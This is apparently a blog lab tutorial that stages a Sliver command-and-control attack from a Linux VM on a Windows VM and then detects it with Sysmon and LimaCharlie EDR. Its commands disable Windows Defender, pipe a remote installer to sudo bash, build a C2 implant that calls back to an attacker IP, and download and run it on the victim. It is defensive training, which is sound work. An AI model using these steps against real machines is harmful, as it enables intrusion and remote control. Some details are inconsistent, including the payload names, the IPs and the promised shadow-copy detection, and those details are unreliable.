![alt text](https://raw.githubusercontent.com/raulpz/raulpz.github.io/main/assets/images/security_banner.jpg)

## Detecting and Hashing a malicious payload with LimaCharlie EDR

Ransomware is some of the most dangerous type of virus affecting several companies now a days, when it happens it's probably too late for Blue Team,
let's see if we can prevent one of the biggest flags of an incoming Ransomware Attack to your Organization, by detecting Shadow Copy deletion commands.
We will be using an EDR solution (Endpoint Detection and Response) tool, with a FREE Organization containing two devices, named LimaCharlie.

## Requirements

-A Linux Endpoint or VM: This is our attacker, we will use it to setup a Command and Control type of attack (C2)
-A Windows OS Endpoint or VM: This is our Victim, our guienea pig, we will attack it, and then change hats colors to defend it.
-Both devices must be on the same Network.
-A Freee Organization in LimaCharlie: You can get up to two sensors for FREE.

## Getting Started

-For this test, we will need to make sure Microsoft Security Defender to be turned OFF. This might be more challenging to do with Windows 11,
but there is a good tool able to silence it permanently if needed.
Enter Sordum's Defender Control:
[Dowload Here](https://www.sordum.org/9480/defender-control-v2-1/)

On a real world scenario, Social Engineering is needed to deceieve a user into running a Script that could launc this tool silently '/s'
and auto disable Windows Defender for us, but for this excersie I will do it manually:

```
Run As Administrator from Windows Terminal or CMD.

dControl.exe /D  = Disables Windows Defender
dControl.exe /E  = Enabled Windows Defender
```
Result:
![alt text](https://raw.githubusercontent.com/raulpz/raulpz.github.io/main/assets/images/WinDefenderOFF.png "Security Defender Disabled")

-Another useful thing to do, would be to prevent this Windows device from going to sleep, in case we will work on this during a long session.
We will do this, by modifying Windows' Power Plan from Command Prompt as administrator, Run:

```
powercfg /change standby-timeout-ac 0
powercfg /change standby-timeout-dc 0
powercfg /change monitor-timeout-ac 0
powercfg /change monitor-timeout-dc 0
powercfg /change hibernate-timeout-ac 0
powercfg /change hibernate-timeout-dc 0
```
## Installing our first secuirty Tool: Sysmon

-System Monitor (Sysmon) is one of the most commonly used add-ons for Windows logging. With Sysmon, you can detect malicious activity by tracking code behavior and network traffic, as well as create detections based on the malicious activity. We will pull the payload and install it using Powershell:

1- Download the installer payload into C:\Windows\Temp folder:
```
Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip
```
2- Unzip the downloaded payload:
```
Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon
```
3- Let's get a custom set of options for SysMon, Download SwiftOnSecurity’s Sysmon config file:
```
Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml
```
4- Install Sysmon and apply it's config file. (this file configures Sysmon for us, to keep an eye on Security Related data).
```
C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i
```
```
C:\Windows\Temp\Sysmon\sysmonconfig.xml
```
Let's Verify Sysmon is up and running:
```
Get-Service sysmon64
```
![alt text](https://raw.githubusercontent.com/raulpz/raulpz.github.io/main/assets/images/Sysmon64OK.png)

## Setting up a new LimaCharlie Organization

What is an EDR?
Endpoint Detection and Response (EDR) is an endpoint security solution that continuously monitors end-user devices to detect and respond to cyber threats like ransomware and malware.

A LimaCharlie account is needed, with one Organization created, you may create one with whatever name you want.

[LimaCharlie Registration HERE](https://app.limacharlie.io/signup)

## Installing our EDR agent (this is where the show beings).

Once we are logged in, we will need to go to Sensors | Sensors List | Add Sensor:
![alt text](https://raw.githubusercontent.com/raulpz/raulpz.github.io/main/assets/images/Add-Sensor.png)

What's a Sensor?
To put it simple, it's our secret agent, infiltrated in the O.S. to report back almost every single bit of network changes, settings changes, unusual acitivty and telemetry in General, back to our EDR solution.

After selecting Windows, an installation key is required, select "Create New", and give it a name, the Windows Hostname will do for now.
Select the previously created Key from the drop-down menu and click Select.

Now follow the instructions outlined, to get our Sensor into the Windows Endpoint.
![alt text](https://raw.githubusercontent.com/raulpz/raulpz.github.io/main/assets/images/install-sensor.png)

Wait a couple of minutes to go back to Sensors List, and your new agent should be already reporting back to our EDR.
![alt text](https://raw.githubusercontent.com/raulpz/raulpz.github.io/main/assets/images/sensor-ok.png)

Now that our Sensor is UP and Online, we will need to give it some specific instructions about the type of data we want from SysMon.
Time to create a new Artifact Collection.

Go to:
1-“Artifact Collection Rules”and click “Add Rule”

2-Name: windows-sysmon-logs

3-Platforms: Windows

4-Path Pattern: wel://Microsoft-Windows-Sysmon/Operational:*

5-Retention Period: 30

6-Then Click “Save”

It should look like this:
![alt text](https://raw.githubusercontent.com/raulpz/raulpz.github.io/main/assets/images/Artifacts-collection.png)

## Onto the attacker Linux VM

I'm ussing this using SSH from the Terminal, you may use Putty or any other software to connect to your Attacker VM via SSH.

We will use Sliver Server for this C2 attack purpose. Some will argue Cobalt Strike is better, but it costs money.

Install it by runnig this command from your Linux SSH Session:
```
curl https://sliver.sh/install|sudo bash
```

And let's add a new Directory to store the bad payload:
```
mkdir -p /opt/sliver
```

Finally we make sure it's alive, by running:
```
sliver-server
```
We should see something like this:
![alt text](https://raw.githubusercontent.com/raulpz/raulpz.github.io/main/assets/images/sliver-server.png)

type "exit" to close our sliver session.

#### We will generate a Command and Conrol (C2) pyload with sliver server

First, obtain your Linux VM IP address.

Then let's elevate to super user with:
```
sudo su
```

Now change directory to the one we created before:
```
cd /opt/sliver
```

And from there, launch sliver-server:
```
sliver-server
```

And we will ask our bad boy to generate a C2 payload for us, replace the IP with the IP address of your own Linux VM:
```
generate --http 172.16.162.129 --save /opt/sliver

##Allow this to run for 2 minutes or so.
```

We should be seeing something like this:
![alt text](https://raw.githubusercontent.com/raulpz/raulpz.github.io/main/assets/images/sliverpayload.png)

C2 Payload name is "APPLICABLE_SUBSTANCE.exe"

Good, type "exit".

Now we need to transfer this payload to our Victim, the Windows O.S. VM.
Thanks to Mr. Capuano (go ahead and google Eric Capuano, follow him, tail him... etc), we have a very simple way of achieving this with Python:
```
python3 -m http.server 80
```
And that's it! (for now...).

#### Now, we are back with our Victim

Open Powershell (or Windows Terminal, we should be using Windows Terminal now a days) as Admin, and run this command, to Download the Payload from the Linux Attacker
into the Downloads folder of our Victim:
```
IWR -Uri http://172.16.162.128/APPLICABLE_SUBSTANCE.exe -Outfile C:\Users\User\Downloads\APPLICABLE_SUBSTANCE.exe 
```
#### Back to the Linux Attacker

This will be quick:

CRTL + C to kill the http server

exit out of sliver-server with "exit"

and Relaunch sliver-server:
```
sliver-server
```
And start our HTTP listener:
```
http
```

#### Now, we are back with our Victim (The Windows O.S. VM)

Time to plant the bomb, as admin from the Terminal, run:
```
C:\Users\User\Downloads\ELECTRIC_BIDET.exe
```
(Don't forget to replace the Name with your payload name).

On the Attacker VM we should see the session or sessions reporting in. To confirm their status, run 'sessions"

If you see one or more sessions, pointing to our Victim VM, we are ready to establish a command anc control attack.

![alt text](https://raw.githubusercontent.com/raulpz/raulpz.github.io/main/assets/images/c2-ready.png)

Run this command, along with the session ID to establish a connection.
```
use 2a2c8e64
```
We are connected, and ready to fire.

To put this to test, you may fire some commands, like
```
info
whoami
getprivs
```
This output confirms we are ready to do some mock-damage:
![alt text](https://raw.githubusercontent.com/raulpz/raulpz.github.io/main/assets/images/Test-commands-c2.png)

#### Time to attack!

We are going to run the 'pwd' and the 'netstat' commands.
```
pwd
netsat
```
The first one is to see where we at (Current Directory), and the second one will display the Active Connections, Process ID and Program in charged of a connection.
Las we could run the command ps -T, to see a list of currently opened processes in Windows.

The output will be:
![alt text](https://raw.githubusercontent.com/raulpz/raulpz.github.io/main/assets/images/ps-T.png)

Notice how we have Yello Warning Sign, pointing to SysMon64, it's there to notify attackers there is security software installed\monitoring this computer.

#### We made some noise, so now our EDR (endpoint detection and response) solution, LimaCharlie, should have information reported by our agent (Sensor).

Go back to your Organization | Sensors | Select our Windows Sensor | Processes (from the menu on the Left).

Here we will be able to see two procees flagged in Yellow, and with the icon telling us this EXE might be transmitting data (Upload, Download or both).
These process are the ones attacking our Windows O.S. with Command and Control (C2) methodology.

![alt text](https://raw.githubusercontent.com/raulpz/raulpz.github.io/main/assets/images/LimaCharliePIDs.png)

We can also do some recon, right there, and reveal our attacker's IP address and port number being used:
![alt text](https://raw.githubusercontent.com/raulpz/raulpz.github.io/main/assets/images/attackerIdentity.png)

From there, the PATH is also exposed, so let's go to c:\Users\User\Downloads\, and inspect our 'APPLICABLE_SUBSTANCE.exe' payload.
There is an option to Hash it (a Hash is unique), against Virus Total DB, most of the Time, a match will be found (good), sometimes it will not (not that good).
If it's not found, it's probably a new virus or one that hasn't been reported.

![alt text](https://raw.githubusercontent.com/raulpz/raulpz.github.io/main/assets/images/PayloadHash.png)
In our case it was not found, but that is fine.

During real world scenarios, this might be a false positive, but pay close attention to the ports, the IP, the files being touched by this, and Registry Keys as well.
If you feel this is malware, stick with it till the end, there no space for "chance" in cybersecurity, because the price to pay for a mistake is high.

Cover your assets, and make sure (document) due diligence was followed before flagging something as Safe (or False Positive).

From here it's a matter of killing it from LimaCharlie, or better yet, build a Detection and Response Rule with LimaCharlie.

END
